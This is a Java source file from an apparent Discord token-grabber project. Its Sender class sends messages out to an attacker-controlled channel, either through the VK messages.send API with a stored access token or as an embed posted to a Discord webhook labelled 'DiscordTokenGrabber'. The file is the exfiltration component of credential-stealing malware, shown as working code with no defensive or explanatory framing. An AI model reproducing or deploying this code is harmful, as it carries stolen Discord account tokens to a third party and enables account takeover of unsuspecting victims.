package com.github.dedinc.discordtokengrabber.utils;

import com.github.dedinc.discordtokengrabber.Main;
import org.json.JSONArray;
import org.json.JSONObject;

public class Sender {

    public void sendMessage(String message) {
        if (Main.vk) {
            Helper.getRequest().get(String.format("https://api.vk.com/method/messages.send?access_token=%s&peer_id=%d&random_id=%d&message=%s&v=5.130", Main.token, Main.receiver, (int) Math.random() * 999999999, message.replace("\n", "%0A")));
        } else {
            JSONObject json = new JSONObject();
            JSONObject json2 = new JSONObject().put("title", "DiscordTokenGrabber").put("description", message).put("color", "65280");
            json.put("embeds", new JSONArray().put(json2));
            Helper.getRequest().post(Main.webHook, json);
        }
    }
}